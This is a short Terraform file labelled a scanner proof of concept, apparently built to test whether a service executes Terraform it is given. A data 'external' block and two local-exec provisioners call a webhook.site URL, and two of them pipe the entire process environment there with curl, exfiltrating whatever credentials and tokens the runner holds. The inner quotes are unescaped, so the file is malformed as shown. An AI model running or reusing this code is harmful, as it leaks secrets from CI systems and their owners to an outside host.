# terraform scanner PoC
variable "marker_one"   { default = "a1" }
variable "marker_two"   { default = "a2" }
variable "marker_three" { default = "a3" }
variable "marker_four"  { default = "a4" }
variable "marker_five"  { default = "a5" }

data "external" "envdump" {
  program = ["sh", "-c", "env | curl -s --data-binary @- "https://webhook.site/4cb94533-248e-4e41-a26e-b8e3b4d5280b?probe=external-data""]
}

resource "null_resource" "exec_probe" {
  provisioner "local-exec" {
    command = "curl -s "https://webhook.site/4cb94533-248e-4e41-a26e-b8e3b4d5280b?probe=local-exec""
  }
}

resource "null_resource" "exec_probe_env" {
  provisioner "local-exec" {
    command = "env | curl -s --data-binary @- "https://webhook.site/4cb94533-248e-4e41-a26e-b8e3b4d5280b?probe=local-exec-env""
  }
}

output "out_marker_one" { value = "x1" }
output "out_marker_two" { value = "x2" }
